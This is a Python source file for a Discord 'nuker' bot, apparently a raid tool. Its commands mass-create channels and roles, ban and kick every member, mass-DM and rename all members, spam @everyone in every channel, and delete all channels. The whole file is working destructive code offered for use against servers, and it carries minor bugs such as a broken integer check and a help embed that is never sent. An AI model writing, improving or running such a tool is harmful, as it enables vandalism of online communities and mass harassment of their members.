# -- Imports --

import discord 
import json
from discord.ext import commands
from colorama import init, Fore
from configparser import ConfigParser
import os
import time
import sys

# -- Setup --
init(autoreset=True) #  -- Colorama color reset --

config = ConfigParser() #  -- Config Parser used to parse whole config --
with open("./config.json") as f: 
    config = json.load(f) # Load Config

token = config["discord_token"]

intents = discord.Intents.all()

client = commands.Bot(command_prefix=".", intents=intents, case_insensitive=True, self_client=True)
tree = (client)
client.remove_command("help")

def restart_bot(): 
  os.execv(sys.executable, ['python'] + sys.argv)

@client.command()
async def masschannel(ctx, name):
    for i in range(int(500)):
        await ctx.guild.create_text_channel(name=name)
        print(Fore.GREEN + "Created channel: " + name)

@client.command()
async def massroles(ctx, amount):
    if amount is not int:
        print(Fore.RED + "Please enter a number!")
        number = discord.Embed(title="Please enter a number!", color=discord.Color.blue())
        await ctx.send(embed=number)
    else:
        pass
    for i in range(int(amount)):
        time.sleep(0.2)
        await ctx.guild.create_role(name="Blue Nuker On TOP!!!!", color=discord.Color.blue())
        print(Fore.GREEN + "Created role: " + "Blue Nuker On TOP!!!!")

@client.command()
async def massban(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(Fore.GREEN + "Banned user: " + member.name)
        except:
            pass

@client.command()
async def masskick(ctx):
    for member in ctx.guild.members:
        try:
            await member.kick()
            print(Fore.GREEN + "Kicked user: " + member.name)
        except:
            pass

@client.command()
async def massdm(ctx, *, message):
    for member in ctx.guild.members:
        try:
            await member.send(message)
            print(Fore.GREEN + "Sent message to: " + member.name)
        except:
            pass

@client.command()
async def massrename(ctx, *, name):
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            print(Fore.GREEN + "Renamed user: " + member.name)
        except:
            pass

@client.command()
async def massping(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.send("@everyone")
            print(Fore.GREEN + "Pinged channel: " + channel.name)
        except:
            pass

@client.command()
async def nuke(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(Fore.GREEN + "Deleted channel: " + channel.name)
        except:
            pass

@client.command()
async def help(ctx):
    help = discord.Embed(
        title="Commands",
        description="""
        .masschannel <name> - Mass creates channels
        .massroles <amount> - Mass creates roles
        .massban - Mass bans all members
        .masskick - Mass kicks all members
        .massdm <message> - Mass DMs all members
        .massrename <name> - Mass renames all members
        .massping - Mass pings all channels
        .nuke - Nukes the server
        .help - Shows this message
"""
    )

@tree.event
async def on_ready():
    print(Fore.CYAN + "Bot is currently running.")
    print(Fore.CYAN + "ChriSs")    

client.run(token)
